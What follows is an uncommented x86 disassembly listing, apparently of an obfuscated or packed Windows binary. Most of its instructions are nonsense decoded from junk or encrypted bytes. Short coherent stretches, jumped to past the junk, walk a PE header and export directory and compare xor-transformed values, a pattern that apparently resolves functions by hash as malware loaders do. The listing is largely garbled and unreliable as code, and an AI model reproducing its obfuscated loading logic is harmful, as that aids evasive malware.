  40f217:	das    
  40f218:	ss icebp 
  40f21a:	clc    
  40f21b:	clc    
  40f21c:	ins    BYTE PTR es:[edi],dx
  40f21d:	dec    esp
  40f21e:	pop    ds
  40f21f:	and    bl,dh
  40f221:	and    eax,0x259f9055
  40f226:	aad    0xb1
  40f228:	mov    ebx,ecx
  40f22a:	ins    DWORD PTR es:[edi],dx
  40f22b:	aaa    
  40f22c:	dec    ebx
  40f22d:	add    ch,bl
  40f22f:	lock ins BYTE PTR es:[edi],dx
  40f231:	and    al,0xfe
  40f233:	adc    DWORD PTR ds:0xc5880122,esi
  40f239:	call   0xdc19:0xa732ef80
  40f240:	xchg   DWORD PTR [eax],edi
  40f242:	xchg   BYTE PTR [ecx],bh
  40f244:	pop    ebp
  40f245:	xor    eax,0xd13c9e85
  40f24a:	and    eax,0xa14ef68
  40f24f:	fdivr  DWORD PTR [ecx-0x58356943]
  40f255:	pop    edi
  40f256:	pop    edi
  40f257:	push   edi
  40f258:	mov    eax,ds:0x1ba57f25
  40f25d:	in     eax,0xc9
  40f25f:	mov    ds:0xc12d78e0,eax
  40f264:	pop    es
  40f265:	retf   
  40f266:	mov    ch,BYTE PTR [edx-0x6427eb58]
  40f26c:	or     edx,DWORD PTR [eax]
  40f26e:	sub    al,0xf4
  40f270:	add    eax,0x392f1c30
  40f275:	mov    ebp,0x9b57f07e
  40f27a:	call   0x97bb:0xe86d536f
  40f281:	inc    esp
  40f282:	neg    BYTE PTR [esi-0x551db2a]
  40f288:	pop    esi
  40f289:	retf   0xe6a4
  40f28c:	(bad)  
  40f28d:	pop    eax
  40f28e:	cli    
  40f28f:	add    BYTE PTR [ebx+ebx*2-0x21],dl
  40f293:	xlat   BYTE PTR ds:[ebx]
  40f294:	hlt    
  40f295:	icebp  
  40f296:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f297:	shl    BYTE PTR [ebp+0x70],cl
  40f29a:	or     dl,BYTE PTR [esi]
  40f29c:	cmp    al,0xfc
  40f29e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f29f:	or     DWORD PTR [eax+0x6a],eax
  40f2a2:	inc    ebp
  40f2a3:	in     al,0x97
  40f2a5:	outs   dx,BYTE PTR ds:[esi]
  40f2a6:	mov    bh,0x42
  40f2a8:	(bad)  
  40f2a9:	bound  ecx,QWORD PTR [edx+0x62]
  40f2ac:	sub    esp,DWORD PTR [edi-0x4e]
  40f2af:	test   al,0xa5
  40f2b1:	imul   ebx,DWORD PTR [ecx-0x4bf38bbb],0x21b7778
  40f2bb:	aad    0xb2
  40f2bd:	stos   BYTE PTR es:[edi],al
  40f2be:	lea    esp,[ebx-0x3e604c5e]
  40f2c4:	and    esp,DWORD PTR [ebx-0x39]
  40f2c7:	add    BYTE PTR [ecx-0x169fcbe2],cl
  40f2cd:	in     eax,0x4
  40f2cf:	add    BYTE PTR [eax],al
  40f2d1:	mov    eax,DWORD PTR [ebp+0x8]
  40f2d4:	mov    ecx,DWORD PTR [ebp-0x8]
  40f2d7:	xor    eax,esi
  40f2d9:	add    eax,edi
  40f2db:	cmp    DWORD PTR [ecx],eax
  40f2dd:	je     0x40f79e
  40f2e3:	mov    ecx,DWORD PTR [ebp-0x18]
  40f2e6:	jmp    0x40f450
  40f2eb:	dec    ebx
  40f2ec:	int3   
  40f2ed:	cmp    esi,ecx
  40f2ef:	mov    ecx,0x99494bcd
  40f2f4:	add    dh,ch
  40f2f6:	rcl    BYTE PTR [ecx+0x76a057a8],1
  40f2fc:	test   eax,0x7fc37070
  40f301:	jo     0x40f373
  40f303:	ins    DWORD PTR es:[edi],dx
  40f304:	add    BYTE PTR [edx+0x3b46a2db],ah
  40f30a:	stos   BYTE PTR es:[edi],al
  40f30b:	add    al,0xa9
  40f30d:	(bad)  
  40f30e:	sahf   
  40f30f:	pop    ecx
  40f310:	into   
  40f311:	xchg   ecx,eax
  40f312:	push   es
  40f313:	xchg   BYTE PTR [edi],cl
  40f315:	mov    bh,0xb9
  40f317:	xchg   BYTE PTR [edi-0xe],cl
  40f31a:	cmc    
  40f31b:	push   esp
  40f31c:	sbb    ecx,ebx
  40f31e:	mov    BYTE PTR [edi+0x6a],ch
  40f321:	adc    DWORD PTR [eax+esi*4-0x7e],ebp
  40f325:	fdiv   DWORD PTR [edi+0xe]
  40f328:	outs   dx,DWORD PTR ds:[esi]
  40f329:	jmp    0x7855:0x185a40a8
  40f330:	mov    eax,ds:0xe59902f6
  40f335:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f336:	cmp    ebp,ebp
  40f338:	ds jl  0x40f333
  40f33b:	add    ah,BYTE PTR [eax-0x111db989]
  40f341:	xchg   edx,eax
  40f342:	and    al,0xb7
  40f344:	adc    edi,ebx
  40f346:	pop    edx
  40f347:	in     al,dx
  40f348:	ins    BYTE PTR es:[edi],dx
  40f349:	dec    esi
  40f34a:	sub    al,0x29
  40f34c:	(bad)  
  40f34d:	cmp    BYTE PTR cs:[eax+0x5a],ch
  40f351:	sbb    eax,0xa90eb3ec
  40f356:	ret    
  40f357:	aad    0x92
  40f359:	sub    BYTE PTR [esi],ch
  40f35b:	test   eax,0xd96b8233
  40f360:	nop
  40f361:	dec    ebp
  40f362:	test   eax,0x211ef0f5
  40f367:	int    0x8b
  40f369:	stos   BYTE PTR es:[edi],al
  40f36a:	mov    dh,0xa7
  40f36c:	or     BYTE PTR [edx-0x6f8dbcdf],bl
  40f372:	jmp    0xa819cec3
  40f377:	dec    ecx
  40f378:	cli    
  40f379:	jno    0x40f369
  40f37b:	ins    DWORD PTR es:[edi],dx
  40f37c:	ja     0x40f359
  40f37e:	jns    0x40f37a
  40f380:	cmp    dl,BYTE PTR [edx+0x2db2d791]
  40f386:	or     DWORD PTR [edx+0x3be7a635],0x3d2df91e
  40f390:	(bad)  
  40f391:	pushf  
  40f392:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f393:	inc    edi
  40f394:	jmp    edx
  40f396:	mov    esp,0x2a5fa3cf
  40f39b:	mov    fs,WORD PTR [ebx]
  40f39d:	fwait
  40f39e:	pushf  
  40f39f:	lea    edi,[esi+0x4c]
  40f3a2:	add    dl,BYTE PTR [ebp+0x38dc97cf]
  40f3a8:	pop    ecx
  40f3a9:	push   ebp
  40f3aa:	sub    BYTE PTR [edx-0x6547d3bd],0xe
  40f3b1:	push   0x41
  40f3b3:	inc    eax
  40f3b4:	rol    DWORD PTR [edi],0xa1
  40f3b7:	outs   dx,BYTE PTR ds:[esi]
  40f3b8:	je     0x40f348
  40f3ba:	cs lock into 
  40f3bd:	imul   esp,DWORD PTR [ebp+0xc9c92d6],0xffffffa3
  40f3c4:	mov    edi,0x3810c6a3
  40f3c9:	mov    edx,0x463053db
  40f3ce:	inc    edx
  40f3cf:	lahf   
  40f3d0:	adc    eax,0xe714937c
  40f3d5:	sub    ecx,ecx
  40f3d7:	test   eax,0xb819d608
  40f3dc:	dec    esi
  40f3dd:	mov    gs,WORD PTR [edx+0x73]
  40f3e0:	retf   
  40f3e1:	stos   BYTE PTR es:[edi],al
  40f3e2:	push   ecx
  40f3e3:	pop    DWORD PTR [edi+edi*2]
  40f3e6:	inc    ebx
  40f3e7:	lods   eax,DWORD PTR ds:[esi]
  40f3e8:	test   eax,0x59d321e4
  40f3ed:	jae    0x40f40b
  40f3ef:	ror    eax,0xc2
  40f3f2:	pop    ds
  40f3f3:	rol    dl,1
  40f3f5:	sbb    al,0x90
  40f3f7:	cmp    eax,0x54bda0ed
  40f3fc:	int    0xc4
  40f3fe:	jle    0x40f3e9
  40f400:	inc    ebp
  40f401:	xor    cl,0x53
  40f404:	fistp  WORD PTR ds:[edi]
  40f407:	jnp    0x40f43d
  40f409:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f40a:	dec    ecx
  40f40b:	cmp    al,0x43
  40f40d:	js     0x40f3c0
  40f40f:	adc    ecx,DWORD PTR [esi-0x1ed1848a]
  40f415:	aad    0xf5
  40f417:	jmp    0x40f441
  40f419:	lahf   
  40f41a:	(bad)  
  40f41b:	jo     0x40f450
  40f41d:	add    al,0xfe
  40f41f:	repnz push esi
  40f421:	inc    edx
  40f422:	push   ecx
  40f423:	dec    eax
  40f424:	leave  
  40f425:	xchg   BYTE PTR [ecx],dh
  40f427:	xchg   ecx,eax
  40f428:	in     eax,0xac
  40f42a:	mov    dh,0xe5
  40f42c:	pop    es
  40f42d:	sub    ebp,DWORD PTR [ecx+0x1b]
  40f430:	mov    ecx,0xaa7148e
  40f435:	mov    bl,0x4a
  40f437:	nop
  40f438:	jb     0x40f46d
  40f43a:	sub    edx,DWORD PTR [edi-0x6e00d1da]
  40f440:	push   es
  40f441:	addr16 mov bl,0xf0
  40f444:	jl     0x40f451
  40f446:	mov    eax,0xa9f3dd75
  40f44b:	lods   eax,DWORD PTR ds:[esi]
  40f44c:	scas   eax,DWORD PTR es:[edi]
  40f44d:	pushf  
  40f44e:	data16 jo 0x40f3dc
  40f451:	inc    ebp
  40f452:	clc    
  40f453:	jmp    0x40f5bd
  40f458:	inc    eax
  40f459:	gs ror ch,cl
  40f45c:	icebp  
  40f45d:	imul   edx,DWORD PTR [ebx+0x65],0x2966c4cb
  40f464:	add    al,0xf4
  40f466:	(bad)  
  40f468:	cmp    DWORD PTR [edi+0x7fc37070],esi
  40f46e:	jo     0x40f4e0
  40f470:	inc    eax
  40f471:	fsubr  st(5),st
  40f473:	sub    eax,0x5f4691ed
  40f478:	gs nop
  40f47a:	loop   0x40f42f
  40f47c:	adc    ah,0x67
  40f47f:	cmp    BYTE PTR [edx],ch
  40f481:	xchg   edi,eax
  40f482:	or     dh,BYTE PTR [esi+ebp*8-0x4fdea1d7]
  40f489:	xor    eax,0x4d90d3e4
  40f48e:	inc    eax
  40f48f:	cmp    ecx,esp
  40f491:	and    bh,BYTE PTR [edx]
  40f493:	stc    
  40f494:	popf   
  40f495:	repnz sbb eax,0x98c65e02
  40f49b:	xchg   DWORD PTR [ecx+0x22b790ac],eax
  40f4a1:	dec    edx
  40f4a2:	jae    0x40f4bd
  40f4a4:	jno    0x40f4a2
  40f4a6:	pusha  
  40f4a7:	dec    edx
  40f4a8:	adc    al,0x27
  40f4aa:	mov    dl,0x62
  40f4ac:	fnstcw WORD PTR [esi-0x4f]
  40f4af:	add    al,BYTE PTR [esi+0x42]
  40f4b2:	mov    ecx,0xfd6be578
  40f4b7:	mov    BYTE PTR [ebx+0x76],bh
  40f4ba:	sahf   
  40f4bb:	jp     0x40f510
  40f4bd:	and    ah,ch
  40f4bf:	sbb    DWORD PTR ss:[bx],0x1
  40f4c4:	ret    
  40f4c5:	xor    al,0x39
  40f4c7:	stc    
  40f4c8:	int3   
  40f4c9:	cmc    
  40f4ca:	cld    
  40f4cb:	xor    BYTE PTR [ecx-0x7dcb6558],0xfb
  40f4d2:	mov    bh,0x22
  40f4d4:	and    DWORD PTR [edx-0x3d85e78e],ebx
  40f4da:	rol    BYTE PTR ds:0x6697fda7,0xd7
  40f4e1:	repz pop edi
  40f4e3:	cld    
  40f4e4:	adc    cl,dh
  40f4e6:	mov    ds:0xc21e1889,eax
  40f4eb:	add    al,0x45
  40f4ed:	cmp    cl,BYTE PTR [edx]
  40f4ef:	dec    ebp
  40f4f0:	fnstcw WORD PTR [eax-0x55a2bd5d]
  40f4f6:	sahf   
  40f4f7:	aam    0x8e
  40f4f9:	pop    ecx
  40f4fa:	mov    ch,0xad
  40f4fc:	jg     0x40f548
  40f4fe:	add    eax,0x92d6b315
  40f503:	out    dx,al
  40f504:	cmp    BYTE PTR [edx+0x47],ch
  40f507:	bound  edi,QWORD PTR [ecx-0x4c]
  40f50a:	sbb    bl,bh
  40f50c:	ret    0xd5f4
  40f50f:	(bad)  
  40f510:	jns    0x40f54b
  40f512:	xor    DWORD PTR [edx+0x19],esp
  40f515:	push   0x2200f0e0
  40f51a:	or     DWORD PTR [esi-0x630b1cbd],edi
  40f520:	jl     0x40f587
  40f522:	fucomp st(4)
  40f524:	aam    0xa8
  40f526:	jmp    0x40f566
  40f528:	jbe    0x40f4d7
  40f52a:	xchg   ebx,eax
  40f52b:	and    eax,0xc0237a6c
  40f530:	pop    edi
  40f531:	mov    al,ds:0x25d41033
  40f536:	mov    si,0xd222
  40f53a:	cmp    BYTE PTR [ebp+0x3800f61f],0xf9
  40f541:	in     eax,dx
  40f542:	adc    eax,0x607fcc81
  40f547:	stos   DWORD PTR es:[edi],eax
  40f548:	dec    eax
  40f549:	dec    ebp
  40f54a:	push   esp
  40f54b:	sbb    eax,0x4eea7825
  40f550:	jmp    0x8f23:0xcad8f6d7
  40f557:	mov    ds:0x99985907,eax
  40f55c:	add    bh,BYTE PTR [eax+0x17]
  40f55f:	out    0x27,al
  40f561:	stos   DWORD PTR es:[edi],eax
  40f562:	xor    eax,0xce5b849c
  40f567:	jmp    0x40f5a6
  40f569:	rsqrtps xmm6,XMMWORD PTR [edi]
  40f56c:	pushf  
  40f56d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f56e:	nop
  40f56f:	out    dx,al
  40f570:	cmc    
  40f571:	pop    ss
  40f572:	mov    ecx,DWORD PTR [ebp-0x2e]
  40f575:	and    eax,0x4feb4c25
  40f57a:	jno    0x40f58f
  40f57c:	sbb    edi,edx
  40f57e:	fmul   st(3),st
  40f580:	inc    ebx
  40f581:	(bad)  
  40f582:	push   0x21
  40f584:	das    
  40f585:	call   0x62e3:0x87f90d7a
  40f58c:	dec    ecx
  40f58d:	sbb    eax,0xa4a3e90f
  40f592:	push   cs
  40f593:	mov    ecx,0xfb3805f3
  40f598:	aas    
  40f599:	mov    ebp,DWORD PTR [edx+0x45]
  40f59c:	scas   al,BYTE PTR es:[edi]
  40f59d:	dec    edi
  40f59e:	(bad)  
  40f59f:	(bad)  
  40f5a0:	fnstcw WORD PTR [eax+0x15dd14b6]
  40f5a6:	lock xor dh,dl
  40f5a9:	in     al,0x83
  40f5ab:	cmp    ch,BYTE PTR [edi]
  40f5ad:	retf   
  40f5ae:	cmp    BYTE PTR [ecx],0xf8
  40f5b1:	pop    es
  40f5b2:	sbb    bh,BYTE PTR [ecx+ebp*1+0x6d]
  40f5b6:	call   0x8fac:0xbea6245b
  40f5bd:	mov    eax,DWORD PTR [eax]
  40f5bf:	mov    eax,DWORD PTR [eax+0x3c]
  40f5c2:	lea    ecx,[ecx*8+0x78]
  40f5c9:	add    eax,ecx
  40f5cb:	mov    ecx,DWORD PTR [ebp-0x8]
  40f5ce:	mov    ecx,DWORD PTR [ecx]
  40f5d0:	mov    eax,DWORD PTR [eax+ecx*1]
  40f5d3:	mov    DWORD PTR [ebp-0x20],eax
  40f5d6:	mov    eax,DWORD PTR [ebp+0x8]
  40f5d9:	xor    eax,esi
  40f5db:	add    eax,edi
  40f5dd:	mov    DWORD PTR [ebp-0x24],eax
  40f5e0:	mov    eax,DWORD PTR [ebp+0x8]
  40f5e3:	mov    ecx,DWORD PTR [ebp-0x20]
  40f5e6:	xor    eax,esi
  40f5e8:	add    eax,edi
  40f5ea:	cmp    ecx,eax
  40f5ec:	je     0x40f7b6
  40f5f2:	jmp    0x40f75c
  40f5f7:	pop    ebx
  40f5f8:	out    dx,al
  40f5f9:	dec    ebp
  40f5fa:	mov    bl,0x49
  40f5fc:	mov    bl,0x61
  40f5fe:	test   BYTE PTR [edx+0xc],0x5a
  40f602:	dec    ebx
  40f603:	in     al,dx
  40f604:	sti    
  40f605:	inc    edx
  40f606:	inc    ecx
  40f607:	mov    WORD PTR [esi+0x7fc37070],?
  40f60d:	jo     0x40f67f
  40f60f:	stos   BYTE PTR es:[edi],al
  40f610:	not    eax
  40f612:	or     dl,BYTE PTR [eax]
  40f614:	pop    eax
  40f615:	push   ss
  40f616:	jae    0x40f5c7
  40f618:	stc    
  40f619:	push   ds
  40f61a:	mov    ch,0x7e
  40f61c:	cld    
  40f61d:	xchg   DWORD PTR [ebx],ebp
  40f61f:	mov    edi,0xebe5afcd
  40f624:	ins    DWORD PTR es:[edi],dx
  40f625:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f626:	daa    
  40f627:	adc    DWORD PTR [ebp-0x62],0x2d50ee1d
  40f62e:	mov    eax,ds:0x8e6ac065
  40f633:	cmp    dl,BYTE PTR [edi-0x734a31e6]
  40f639:	inc    esp
  40f63a:	rcl    DWORD PTR [ebx],1
  40f63c:	jbe    0x40f607
  40f63e:	mov    esi,0x5eb4a62e
  40f643:	aaa    
  40f644:	into   
  40f645:	test   cl,cl
  40f647:	pusha  
  40f648:	div    edi
  40f64a:	loope  0x40f5d2
  40f64c:	ins    BYTE PTR es:[edi],dx
  40f64d:	imul   ebx,DWORD PTR [eax+ebp*1+0x48],0x84d31f33
  40f655:	call   0x933a10c0
  40f65a:	call   0xa17a:0xa6374191
  40f661:	or     DWORD PTR [edx-0x73],0xfb24790b
  40f668:	mov    WORD PTR [ebx-0x7872861d],es
  40f66e:	add    DWORD PTR ds:[esi],edx
  40f671:	pop    esp
  40f672:	aaa    
  40f673:	iret   
  40f674:	cs pop edi
  40f676:	mov    al,ds:0x945485b0
  40f67b:	add    al,0x68
  40f67d:	pop    eax
  40f67e:	into   
  40f67f:	setl   BYTE PTR [edi+0xb]
  40f683:	and    al,0x95
  40f685:	pop    esi
  40f686:	pushf  
  40f687:	cmp    edi,DWORD PTR [esi+0x9d901ec]
  40f68d:	(bad)  
  40f68e:	mov    esp,0xa20e9704
  40f693:	sahf   
  40f694:	cmc    
  40f695:	pop    es
  40f696:	aaa    
  40f697:	sbb    ebx,DWORD PTR [edx+0x24fe6b31]
  40f69d:	loopne 0x40f70c
  40f69f:	nop
  40f6a0:	cld    
  40f6a1:	push   ss
  40f6a2:	les    ecx,FWORD PTR [edi+esi*4]
  40f6a5:	xchg   ecx,eax
  40f6a6:	leave  
  40f6a7:	jmp    0x1d75cf48
  40f6ac:	test   BYTE PTR [esi-0x341a7e3c],0xde
  40f6b3:	lods   al,BYTE PTR ds:[esi]
  40f6b4:	aam    0xb8
  40f6b6:	pop    ds
  40f6b7:	mov    gs,ebx
  40f6b9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f6ba:	dec    eax
  40f6bb:	ins    DWORD PTR es:[edi],dx
  40f6bc:	mov    ch,dh
  40f6be:	shr    DWORD PTR [ecx+0x683a1e53],0x63
  40f6c5:	add    al,0x1a
  40f6c7:	add    edi,DWORD PTR [edx-0x54]
  40f6ca:	out    0x26,al
  40f6cc:	push   eax
  40f6cd:	xor    ah,BYTE PTR [bx+di-0x65]
  40f6d2:	cdq    
  40f6d3:	dec    esp
  40f6d4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f6d5:	xchg   DWORD PTR [eax],ebp
  40f6d7:	cwde   
  40f6d8:	enter  0x7f01,0xf7
  40f6dc:	add    al,0x3e
  40f6de:	scas   al,BYTE PTR es:[edi]
  40f6df:	xchg   esp,eax
  40f6e0:	sub    edi,DWORD PTR [ebx]
  40f6e2:	in     al,dx
  40f6e3:	es or  eax,0x687ba41d
  40f6e9:	(bad)  
  40f6ea:	jecxz  0x40f74a
  40f6ec:	inc    ebx
  40f6ed:	sti    
  40f6ee:	dec    ebp
  40f6ef:	or     ecx,DWORD PTR [esi+0x202c626a]
  40f6f5:	outs   dx,DWORD PTR ds:[esi]
  40f6f6:	push   esp
  40f6f7:	sar    ebx,cl
  40f6f9:	push   ebx
  40f6fa:	dec    ecx
  40f6fb:	jecxz  0x40f6da
  40f6fd:	xchg   ebp,eax
  40f6fe:	adc    DWORD PTR es:[edi+ebp*8-0x6d],ecx
  40f703:	xchg   esp,eax
  40f704:	adc    esp,DWORD PTR [ebx-0x69964aa1]
  40f70a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f70b:	add    DWORD PTR [edi+0x41],ebx
  40f70e:	mov    eax,0x7ed0b3fe
  40f713:	inc    esp
  40f714:	push   edx
  40f715:	xor    eax,eax
  40f717:	in     eax,0xaf
  40f719:	inc    ebx
  40f71a:	dec    esp
  40f71b:	aas    
  40f71c:	mov    al,ds:0x5d71c4d6
  40f721:	fistp  WORD PTR [eax]
  40f723:	imul   ebx,esp,0x32db9ccd
  40f729:	xor    dl,al
  40f72b:	mov    cl,0x91
  40f72d:	les    ecx,FWORD PTR [ebx+0x54486a13]
  40f733:	sub    al,0x9f
  40f735:	mov    ebp,DWORD PTR [edi]
  40f737:	jle    0x40f6fc
  40f739:	and    DWORD PTR [esp+ebp*8],edi
  40f73c:	sahf   
  40f73d:	cmp    eax,0x12b53b82
  40f742:	dec    esi
  40f743:	jno    0x40f7ac
  40f745:	fisttp DWORD PTR [eax+0x5638e945]
  40f74b:	sbb    ah,BYTE PTR [esi]
  40f74d:	cs xchg ebp,eax
  40f74f:	retf   0xe641
  40f752:	pop    edi
  40f753:	dec    edx
  40f754:	add    eax,0x349c5eb7
  40f759:	mov    ch,0x21
  40f75b:	and    cl,BYTE PTR [ebx+0x4d8bf845]
  40f761:	loopne 0x40f766
  40f763:	or     BYTE PTR [ecx+0x458bdc4d],cl
  40f769:	fmul   QWORD PTR [ebx+0x408bf84d]
  40f76f:	or     al,0x8b
  40f771:	or     DWORD PTR [edx+0x37040804],ecx
  40f777:	xor    al,0x47
  40f779:	cmp    al,0xc5
  40f77b:	je     0x40f792
  40f781:	mov    eax,DWORD PTR [ebp+0x8]
  40f784:	mov    ecx,DWORD PTR [ebp-0x8]
  40f787:	xor    eax,esi
  40f789:	add    eax,edi
  40f78b:	mov    DWORD PTR [ecx],eax
  40f78d:	jmp    0x40f7b6
  40f792:	xor    DWORD PTR [ebp-0xc],0x5fd8f
  40f799:	jmp    0x40f7b6
  40f79e:	mov    eax,DWORD PTR [ebp-0x8]
  40f7a1:	mov    ecx,DWORD PTR [ebp-0x1c]
  40f7a4:	mov    ecx,DWORD PTR [ecx]
  40f7a6:	mov    DWORD PTR [eax],ecx
  40f7a8:	mov    eax,DWORD PTR [ebp+0xc]
  40f7ab:	mov    eax,DWORD PTR [ebp+0x8]
  40f7ae:	push   DWORD PTR [ebp-0x8]
  40f7b1:	call   0x401000
  40f7b6:	mov    eax,DWORD PTR [ebp-0xc]
  40f7b9:	cmp    eax,ebx
  40f7bb:	je     0x40e863
  40f7c1:	mov    eax,DWORD PTR [ebp-0x8]
  40f7c4:	mov    eax,DWORD PTR [eax]
  40f7c6:	pop    edi
  40f7c7:	pop    esi
  40f7c8:	pop    ebx
  40f7c9:	leave  
  40f7ca:	ret    0x8
  40f7cd:	push   ebp
  40f7ce:	mov    ebp,esp
  40f7d0:	jmp    0x40fb9a
  40f7d5:	ds cmp al,0x79
  40f7d8:	adc    BYTE PTR [ecx-0x23],bh
  40f7db:	(bad)  
  40f7dd:	dec    ebp
  40f7de:	xor    eax,0x37f246f3
  40f7e3:	sub    ah,dh
  40f7e5:	pop    edi
  40f7e6:	mov    ch,0x70
  40f7e8:	jo     0x40f78d
  40f7ea:	jge    0x40f85c
  40f7ec:	jo     0x40f773
  40f7ee:	mov    cl,0xc5
  40f7f0:	pushf  
  40f7f1:	popf   
  40f7f2:	clc    
  40f7f3:	mov    esp,0x29ba62f
  40f7f8:	aaa    
  40f7f9:	fiadd  WORD PTR [edx]
  40f7fb:	sub    cl,BYTE PTR [ebx+0x19b240c9]
  40f801:	std    
  40f802:	inc    eax
  40f803:	stos   BYTE PTR es:[edi],al
  40f804:	fsubrp st(7),st
  40f806:	push   cs
  40f807:	stos   BYTE PTR es:[edi],al
  40f808:	out    dx,eax
  40f809:	sbb    bl,BYTE PTR es:[edx+0x6d]
  40f80d:	sbb    ebp,DWORD PTR [edi+0x1057e9b2]
  40f813:	xchg   esp,eax
  40f814:	test   BYTE PTR [ecx],bl
  40f816:	lea    ebx,[edx]
  40f818:	xor    DWORD PTR [eax],ebx
  40f81a:	test   al,bh
  40f81c:	push   edi
  40f81d:	add    DWORD PTR [esi-0x4971f745],esp
  40f823:	cli    
  40f824:	cmp    edi,DWORD PTR [ecx-0x29dc94ed]
  40f82a:	adc    ebx,ebx
  40f82c:	bound  ebp,QWORD PTR [ebp+0x1a]
  40f82f:	ficom  WORD PTR [edi+edx*2-0x2c]
  40f833:	cmp    edx,DWORD PTR [edx]
  40f835:	fsub   QWORD PTR [edx+0x4a7037f6]
  40f83b:	mov    ah,0x4c
  40f83d:	jge    0x40f876
  40f83f:	inc    edi
  40f840:	pop    edi
  40f841:	xor    DWORD PTR [edx-0x7],0x884f3028
  40f848:	mov    al,0xa4
  40f84a:	adc    al,0xd
  40f84c:	das    
  40f84d:	sub    eax,DWORD PTR [edi]
  40f84f:	mov    dl,0x16
  40f851:	jl     0x40f89c
  40f853:	lock icebp 
  40f855:	cmp    al,0xfd
  40f857:	dec    bp
  40f859:	imul   esp,DWORD PTR [edi],0x61
  40f85c:	push   ecx
  40f85d:	into   
  40f85e:	scas   eax,DWORD PTR es:[edi]
  40f85f:	xchg   DWORD PTR [esi+0x47],ecx
  40f862:	sbb    ebx,DWORD PTR [ebx-0x13]
  40f865:	pop    edx
  40f866:	xchg   DWORD PTR [edi],esi
  40f868:	add    bl,BYTE PTR [esi+edi*2-0x674cca59]
  40f86f:	clc    
  40f870:	pop    edi
  40f871:	sbb    DWORD PTR ss:[ecx-0x3ed8901f],edx
  40f878:	add    BYTE PTR [ecx+ebx*8-0x668d2787],bh
  40f87f:	call   0xcd3a488c
  40f884:	sti    
  40f885:	rcr    DWORD PTR [ecx+0x38],0x67
  40f889:	add    ebx,ebp
  40f88b:	in     al,0xe0
  40f88d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f88e:	xor    ch,ah
  40f890:	pop    ebx
  40f891:	fidiv  DWORD PTR ds:0x1ecb1feb
  40f897:	mov    edi,DWORD PTR [ebx+0x50]
  40f89a:	cmc    
  40f89b:	int    0x2f
  40f89d:	push   cs
  40f89e:	cwde   
  40f89f:	mov    DWORD PTR ds:[ebp+0x7c6bdc1f],eax
  40f8a6:	xchg   BYTE PTR [esi+0x1],ch
  40f8a9:	ror    BYTE PTR [ecx],0x2f
  40f8ac:	lea    ebp,[ecx+eiz*4+0x3dc8df81]
  40f8b3:	xchg   ebx,eax
  40f8b4:	cwde   
  40f8b5:	mov    ds:0x9d541291,eax
  40f8ba:	test   eax,0xfce35882
  40f8bf:	leave  
  40f8c0:	push   ebx
  40f8c1:	imul   esp,ecx,0xffffffa7
  40f8c4:	and    DWORD PTR [ebp+eiz*4-0x70],0x32
  40f8c9:	call   0x625ea2db
  40f8ce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f8cf:	out    0x84,al
  40f8d1:	push   esp
  40f8d2:	daa    
  40f8d3:	ins    BYTE PTR es:[edi],dx
  40f8d4:	sbb    dl,BYTE PTR [ebp+0x1cd5f35f]
  40f8da:	ss fneni(8087 only) 
  40f8dd:	mov    esp,0xb8314b72
  40f8e2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f8e3:	xchg   edx,eax
  40f8e4:	mov    al,ds:0x8b5e05a7
  40f8e9:	and    ebp,DWORD PTR [eax]
  40f8eb:	jbe    0x40f896
  40f8ed:	sub    eax,0x843e81e0
  40f8f2:	dec    ecx
  40f8f3:	sbb    ch,bh
  40f8f5:	or     bh,bl
  40f8f7:	out    0x82,eax
  40f8f9:	dec    eax
  40f8fa:	aam    0xba
  40f8fc:	(bad)  
  40f8fd:	aaa    
  40f8fe:	mov    cl,0xe6
  40f900:	sub    ch,BYTE PTR [edi]
  40f902:	xchg   esi,eax
  40f903:	push   ebx
  40f904:	xchg   ebp,eax
  40f905:	dec    esp
  40f906:	stos   DWORD PTR es:[edi],eax
  40f907:	sbb    esi,DWORD PTR [edx+0x6b]
  40f90a:	cs push ecx
  40f90c:	jl     0x40f91b
  40f90e:	fisubr WORD PTR [edx+esi*1+0x35e5b5d]
  40f915:	(bad)  
  40f916:	sbb    bh,dh
  40f918:	shl    BYTE PTR [edi+0x6d2e669d],1
  40f91e:	cmc    
  40f91f:	and    edi,DWORD PTR [eax]
  40f921:	or     al,0x4
  40f923:	xor    eax,0xd24ba12f
  40f928:	push   edx
  40f929:	push   0xb6027eb6
  40f92e:	and    ah,BYTE PTR [esi]
  40f930:	or     al,0xe
  40f932:	jmp    0xefa2a585
  40f937:	push   edx
  40f938:	inc    ecx
  40f939:	cmp    esp,DWORD PTR ds:0x30672bc0
  40f93f:	das    
  40f940:	mov    bh,0x2c
  40f942:	mov    ds:0x50088ad7,eax
  40f947:	xchg   edi,eax
  40f948:	leave  
  40f949:	test   BYTE PTR [edi],0x6d
  40f94c:	rol    DWORD PTR [edx+0x4965b7c1],0x8f
  40f953:	push   esp
  40f954:	fbstp  TBYTE PTR [edx+0x324dd902]
  40f95a:	push   0xf87476c1
  40f95f:	inc    edi
  40f960:	je     0x40f98d
  40f962:	pop    edx
  40f963:	call   0x9aae8c6b
  40f968:	cld    
  40f969:	jl     0x40f939
  40f96b:	(bad)  
  40f96c:	sbb    eax,0x9c1045f3
  40f971:	aaa    
  40f972:	xchg   edi,eax
  40f973:	loope  0x40f9d9
  40f975:	stos   DWORD PTR es:[edi],eax
  40f976:	jno    0x40f8fc
  40f978:	pop    es
  40f979:	aaa    
  40f97a:	loope  0x40f928
  40f97c:	push   ebx
  40f97d:	aad    0xab
  40f97f:	bound  edx,QWORD PTR es:[esi-0x7262124b]
  40f986:	mov    bh,0xbb
  40f988:	sub    bh,ah
  40f98a:	mov    es,esp
  40f98c:	xor    eax,DWORD PTR [esi+ebp*8]
  40f98f:	pop    ebp
  40f990:	loope  0x40f982
  40f992:	popa   
  40f993:	call   0xfda30101
  40f998:	(bad)  [ebx-0x3a]
